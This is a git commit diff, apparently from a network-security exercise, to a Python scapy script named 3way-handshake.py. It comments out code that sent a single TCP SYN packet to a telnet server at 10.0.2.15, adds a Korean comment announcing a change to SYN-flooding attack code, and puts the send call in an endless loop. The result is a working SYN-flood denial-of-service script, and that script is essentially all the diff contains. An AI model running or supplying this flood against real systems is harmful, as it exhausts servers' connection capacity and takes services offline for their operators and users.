b48ceeb6dcf0e01e7a13cfee8cbb08b685462327
배지원 <bjiwon2005@naver.com>
2018-11-13 16:19:39 +0900

    SYN packet

--- 3way-handshake.py
+++ 3way-handshake.py
@@ -1,5 +1,11 @@
 from scapy.all import *
 
 # 연결 요청하는 SYN 패킷 생성 - ex)우분투 텔넷 서버를 대상으로 요청함
+# syn = IP (dst = "10.0.2.15") / TCP (sport = RandShort (), dport = 23, flags = "S")
+# send (syn)
+
+
+#SYN FLOODING 공격할 수 있는 코드로 변경
 syn = IP (dst = "10.0.2.15") / TCP (sport = RandShort (), dport = 23, flags = "S")
-send (syn)
+while True:
+    send (syn)
